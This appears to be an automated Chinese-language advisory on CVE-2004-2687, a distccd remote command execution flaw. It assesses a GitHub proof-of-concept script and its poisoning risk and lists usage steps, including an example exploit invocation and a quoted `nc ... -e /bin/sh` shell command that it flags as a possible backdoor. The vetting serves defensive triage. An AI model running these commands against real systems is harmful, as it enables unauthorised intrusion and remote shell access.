## CVE-2004-2687-distccd-远程命令执行

**漏洞编号:** CVE-2004-2687

**漏洞类型:** 远程命令执行

**影响应用:** distccd

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** < 3.1

**利用条件:** 目标系统运行未受限制访问的 distccd 服务

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2004-2687 存在于 distccd 2.x 版本中。当 distccd 未配置为限制对服务器端口的访问时，远程攻击者可以通过编译任务执行任意命令。该漏洞的利用方式是向 distccd 服务发送特制的请求，其中包含要执行的命令。由于 distccd 在执行编译任务时没有进行适当的授权检查，因此可以执行攻击者提供的任意命令。

**有效性分析：**

根据漏洞信息、搜索结果以及提供的漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息描述了该漏洞，搜索引擎结果中包含多个关于此漏洞的报告和分析，并且存在 Metasploit 模块。提供的 POC 代码 `distccd_rce.py` 实现了利用该漏洞执行任意命令的功能，其工作原理与漏洞描述相符，并且文档中包含了利用示例。

**投毒风险分析：**

分析提供的 `distccd_rce.py` 脚本，脚本本身实现了漏洞利用的功能。脚本从命令行参数接收目标主机、端口和要执行的命令，然后构造包含该命令的 payload 发送给目标 distccd 服务。脚本中没有发现明显的恶意代码，例如反弹 shell 到未知地址，或者删除系统文件等。但考虑到漏洞利用本身可以执行任意命令，如果攻击者修改了脚本并诱导用户使用，则可以植入恶意代码。代码本身是 Metasploit 移植过来的，相对安全,投毒风险很低。README.md中调用`nc [localhost] [lport] -e /bin/sh`,有后门嫌疑.

**利用方式：**

1.  **确定目标：** 找到运行 distccd 服务的系统，并且该服务未配置访问限制。
2.  **准备 exploit：** 准备 `distccd_rce.py` 脚本。
3.  **执行命令：** 使用脚本指定目标 IP 地址、端口和要执行的命令。例如，`python3 distccd_rce.py -t <target_ip> -p 3632 -c "id"` 将在目标系统上执行 `id` 命令。
4.  **获取结果：** 脚本会打印命令执行的结果。

由于 distccd 服务通常以较低权限运行，因此利用该漏洞获得的权限可能有限。但攻击者可以通过进一步的提权操作来获得更高的权限。


**项目地址:** [h3x0v3rl0rd/distccd_rce_CVE-2004-2687](https://github.com/h3x0v3rl0rd/distccd_rce_CVE-2004-2687)

**漏洞详情:** [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)